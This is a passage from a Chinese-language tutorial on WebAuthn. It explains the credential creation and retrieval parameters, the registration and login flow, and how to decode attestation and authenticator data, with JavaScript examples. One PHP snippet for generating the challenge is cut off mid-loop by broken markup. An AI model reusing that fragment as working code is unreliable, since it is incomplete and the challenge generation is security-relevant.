发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 